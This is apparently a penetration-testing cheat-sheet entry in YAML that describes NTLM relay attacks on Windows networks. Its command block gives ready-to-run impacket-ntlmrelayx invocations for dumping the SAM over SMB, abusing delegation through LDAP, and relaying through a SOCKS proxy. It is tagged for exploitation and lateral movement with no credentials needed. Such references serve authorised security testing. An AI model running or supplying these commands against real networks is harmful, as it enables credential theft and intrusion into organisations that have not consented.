---
description: |
  Relay captured NTLM authentication to other services on the network.
  Often combined with Responder (with SMB/HTTP off).

  Reference values:
    Target IP: 10.10.10.1
command: |
  # Relay to SMB for SAM dump
  impacket-ntlmrelayx -tf targets.txt -smb2support

  # Relay to LDAP for delegation abuse
  impacket-ntlmrelayx -t ldap://10.10.10.1 --delegate-access

  # Relay with SOCKs proxy
  impacket-ntlmrelayx -tf targets.txt -smb2support -socks
phase:
  - Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - NTLM
  - SMB
  - LDAP
ports:
  - "445"
  - "389"
items:
  - No_Creds
techniques:
  - NTLM_Relay
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
